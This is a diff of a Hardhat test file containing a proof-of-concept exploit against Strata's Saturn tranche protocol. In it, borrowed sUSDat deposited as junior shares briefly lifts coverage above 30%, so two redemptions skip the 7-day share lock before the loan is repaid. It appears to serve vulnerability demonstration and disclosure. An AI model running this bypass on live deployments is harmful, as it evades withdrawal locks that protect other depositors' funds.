@@ -1,136 +1,142 @@
 import { HardhatProvider } from 'dequanto/hardhat/HardhatProvider';
 import { UTest } from 'atma-utest';
-import { $erc20 } from '../utils/$erc20';
-import { $tranche } from '../utils/$tranche';
-import { $hh } from '../utils/$hh';
 import { $require } from 'dequanto/utils/$require';
 import { $bigint } from 'dequanto/utils/$bigint';
+import { $hh } from '../utils/$hh';
+import { $erc20 } from '../utils/$erc20';
 import { $erc4626 } from '../utils/$erc4626';
-import { $exitMode } from '@s/utils/$exitMode';
 
 /**
- * Transient JRT coverage bypass PoC.
+ * Transient JRT coverage bypass — Saturn-native classification PoC.
  *
- * Saturn-shaped production parameters:
- *   coverage <= 15%: 21 day JRT share lock, 0 bps
- *   15% < coverage <= 30%: 7 day JRT share lock, 10 bps
- *   coverage > 30%: immediate exit, 20 bps
- *   minimum JRT/SRT ratio: 7.5%
+ * Uses Strata's real Saturn deployment stack and production configuration:
+ *   coverage <= 15%: 21-day JRT lock, 0 bps
+ *   15% < coverage <= 30%: 7-day JRT lock, 10 bps
+ *   coverage > 30%: immediate, 20 bps
+ *   hard minimum JRT/SRT ratio: 7.5%
  *
- * The strategy is intentionally not mocked here. The PoC targets the generic
- * StrataCDO/Tranche/SharesCooldown classification logic: temporary Junior NAV
- * is counted by coverage(), can select the zero-lock tier, and can then be
- * withdrawn again because each redemption re-evaluates only instantaneous
- * coverage and maxWithdraw() enforces only the lower hard ratio.
+ * A lender owns sUSDat before the snapshot. The attacker temporarily borrows
+ * those existing strategy-token units, deposits them as JRT, uses the resulting
+ * coverage to move two independent redemptions into the zero-lock tier, then
+ * repays the exact sUSDat units. No flash-minted protocol asset is required.
  */
 
-let hh = new HardhatProvider();
-let attacker = await hh.deployer(1);
-let liquidityProvider = await hh.deployer(2);
+const hh = new HardhatProvider();
+const attacker = await hh.deployer(1);
+const liquidityProvider = await hh.deployer(2);
+const lender = await hh.deployer(3);
+const test = await $hh.create('saturn');
 
-let {
+const {
     jrtVault,
     srtVault,
-    sharesCooldown,
-    accounting,
     cdo,
-    USDe,
-} = await $hh.test.deploy({ initialDeposit: false });
+} = await test.deploy({ initialDeposit: false });
+const { base, sUSDat } = await test.factory.ensureUnderlying();
+const { sharesCooldown } = await test.factory.ensureCooldowns(cdo);
+const { deployer } = test;
 
-let { configManager } = await $hh.test.factory.ensureConfigManager();
-let { deployer } = $hh.test;
+// Ordinary LP seeds both tranches. Attacker later acquires pre-existing JRT.
+await $erc20.mint(base, deployer, liquidityProvider, 1_230);
+await $erc4626.depositMeta(jrtVault, base.address, liquidityProvider, 230);
+await $erc4626.depositMeta(srtVault, base.address, liquidityProvider, 1_000);
+await $erc20.transfer(jrtVault, liquidityProvider, attacker.address, 25);
 
-await $erc20.mint(USDe, deployer, attacker, 1_000);
-await $erc20.mint(USDe, deployer, liquidityProvider, 5_000);
+// Lender acquires the temporary strategy-token capital before the attack.
+// 105 USDat-equivalent is enough to lift ~23% coverage above 30% and keep it
+// above 30% after the old 25-JRT position exits.
+const LOAN_VALUE = 105n * 10n ** 6n;
+const loanShares = await sUSDat.convertToShares(LOAN_VALUE);
+await $erc4626.mint(sUSDat as any, lender, loanShares);
+$require.eq(await sUSDat.balanceOf(lender.address), loanShares);
 
-// Saturn hard withdrawal floor / deposit buffer.
-await accounting.$receipt().setMinimumJrtSrtRatioBuffer(deployer, $bigint.toWei(0.08));
-await accounting.$receipt().setMinimumJrtSrtRatio(deployer, $bigint.toWei(0.075));
+const initialCoverage = Number(await cdo.coverage());
+$require.gt(initialCoverage, 150_000);
+$require.lt(initialCoverage, 300_000);
 
-await $hh.test.factory.addRoles({
-    [cdo.address]: [
-        await sharesCooldown.COOLDOWN_WORKER_ROLE()
-    ]
-});
-
-// Exact Saturn JRT exit tiers from src/platforms/strats/SaturnTranche.ts.
-await $exitMode.set(sharesCooldown, configManager, jrtVault.address, [
-    { covPct: 15, feeBps: 0,  lock: '21days' },
-    { covPct: 30, feeBps: 10, lock: '7days'  },
-    { covPct: 0,  feeBps: 20, lock: 0        },
-]);
-
-// Production-shaped state: 230 nominal JRT / 1000 nominal SRT, safely inside
-// Saturn's protected 15-30% tier. The exact strategy conversion can introduce
-// harmless sub-percent rounding, so the proof asserts the tier, not 23.0000%.
-await $tranche.deposit(jrtVault, liquidityProvider, USDe, 205.0);
-await $tranche.deposit(jrtVault, attacker, USDe, 25.0);
-await $tranche.deposit(srtVault, liquidityProvider, USDe, 1000.0);
-
-await $hh.test.snapshot('transient-coverage-bypass');
+await test.snapshot('transient-coverage-bypass-saturn');
 
 UTest.create({
     async $after () {
-        await $hh.test.reset();
+        await test.wipe();
     },
     async $teardown () {
-        await $hh.test.reset('transient-coverage-bypass');
+        await test.reset('transient-coverage-bypass-saturn');
     },
 
-    async 'control: protected coverage forces the existing JRT into the 7-day SharesCooldown' () {
-        let coverage = Number(await cdo.coverage());
-        $require.gt(coverage, 150_000);
-        $require.lt(coverage, 300_000);
+    async 'control: Saturn protected-tier JRT is placed in SharesCooldown' () {
+        const oldShares = await jrtVault.balanceOf(attacker.address);
+        const cooldownBefore = await jrtVault.balanceOf(sharesCooldown.address);
+        const attackerSUSDatBefore = await sUSDat.balanceOf(attacker.address);
 
-        let oldShares = await jrtVault.balanceOf(attacker.address);
-        let cooldownBefore = await jrtVault.balanceOf(sharesCooldown.address);
+        const immediateOut = await $erc4626.redeemMeta(
+            jrtVault,
+            sUSDat.address,
+            attacker,
+            oldShares,
+        );
 
-        let assetsNow = await $erc4626.redeem(jrtVault, attacker, oldShares);
-
-        // Protected-tier redemption does not remove strategy assets now; shares are escrowed.
-        $require.eq(assetsNow, 0n);
+        $require.eq(immediateOut, 0n);
+        $require.eq(await sUSDat.balanceOf(attacker.address), attackerSUSDatBefore);
         $require.eq(await jrtVault.balanceOf(attacker.address), 0n);
         $require.gt(await jrtVault.balanceOf(sharesCooldown.address), cooldownBefore);
     },
 
-    async 'attack: temporary JRT raises coverage above 30%, lets both withdrawals execute, then coverage falls back below 30%' () {
-        let coverageBefore = Number(await cdo.coverage());
+    async 'attack: temporary sUSDat-funded JRT unlocks both exits and is repaid' () {
+        const coverageBefore = Number(await cdo.coverage());
         $require.gt(coverageBefore, 150_000);
         $require.lt(coverageBefore, 300_000);
 
-        let oldShares = await jrtVault.balanceOf(attacker.address);
-        let cooldownBefore = await jrtVault.balanceOf(sharesCooldown.address);
+        const oldShares = await jrtVault.balanceOf(attacker.address);
+        const cooldownBefore = await jrtVault.balanceOf(sharesCooldown.address);
 
-        await $tranche.deposit(jrtVault, attacker, USDe, 100.0);
-        let coverageBoosted = Number(await cdo.coverage());
-        $require.gt(coverageBoosted, 300_000);
+        // Temporary existing sUSDat, modeled as a lender-funded loan.
+        await $erc20.transfer(sUSDat, lender, attacker.address, loanShares);
+        await $erc4626.depositMeta(jrtVault, sUSDat.address, attacker, loanShares);
 
-        // First independent withdrawal: the pre-existing JRT exits immediately.
-        let oldAssetsOut = await $erc4626.redeem(jrtVault, attacker, oldShares);
+        $require.gt(Number(await cdo.coverage()), 300_000);
+
+        // First independent redemption: pre-existing JRT exits synchronously to
+        // sUSDat because Saturn's JRT sUSDat strategy cooldown is configured to 0.
+        const oldAssetsOut = await $erc4626.redeemMeta(
+            jrtVault,
+            sUSDat.address,
+            attacker,
+            oldShares,
+        );
         $require.gt(oldAssetsOut, 0n);
 
-        // Coverage remains >30%, so the temporary JRT independently receives the
-        // immediate tier as well.
-        let coverageAfterOldExit = Number(await cdo.coverage());
-        $require.gt(coverageAfterOldExit, 300_000);
+        // The temporary JRT still holds coverage above the zero-lock threshold.
+        $require.gt(Number(await cdo.coverage()), 300_000);
 
-        let temporaryShares = await jrtVault.balanceOf(attacker.address);
+        // Second independent redemption: unwind the temporary JRT itself.
+        const temporaryShares = await jrtVault.balanceOf(attacker.address);
         $require.gt(temporaryShares, 0n);
-
-        let temporaryAssetsOut = await $erc4626.redeem(jrtVault, attacker, temporaryShares);
+        const temporaryAssetsOut = await $erc4626.redeemMeta(
+            jrtVault,
+            sUSDat.address,
+            attacker,
+            temporaryShares,
+        );
         $require.gt(temporaryAssetsOut, 0n);
 
+        // Neither redemption served Saturn's 7-day share lock.
         $require.eq(await jrtVault.balanceOf(attacker.address), 0n);
         $require.eq(await jrtVault.balanceOf(sharesCooldown.address), cooldownBefore);
 
-        // The temporary coverage is gone; the protocol is back in a tier where the
-        // same JRT exit would have been locked.
-        let coverageAfterAttack = Number(await cdo.coverage());
-        $require.gt(coverageAfterAttack, 150_000);
-        $require.lt(coverageAfterAttack, 300_000);
+        // Coverage immediately falls back into the same protected 15-30% band.
+        const coverageAfter = Number(await cdo.coverage());
+        $require.gt(coverageAfter, 150_000);
+        $require.lt(coverageAfter, 300_000);
 
-        let totalAssetsOut = oldAssetsOut + temporaryAssetsOut;
-        $require.gt(totalAssetsOut, $bigint.toWei(124.0));
-        $require.lt(totalAssetsOut, $bigint.toWei(125.0));
-    }
+        // Repay exactly the strategy-token units that were borrowed.
+        $require.gte(await sUSDat.balanceOf(attacker.address), loanShares);
+        await $erc20.transfer(sUSDat, attacker, lender.address, loanShares);
+        $require.eq(await sUSDat.balanceOf(lender.address), loanShares);
+
+        // Old JRT value remains with the attacker after repaying temporary capital.
+        const attackerResidual = await sUSDat.balanceOf(attacker.address);
+        $require.gt(attackerResidual, 20n * 10n ** 18n);
+        $require.lt(attackerResidual, 30n * 10n ** 18n);
+    },
 });
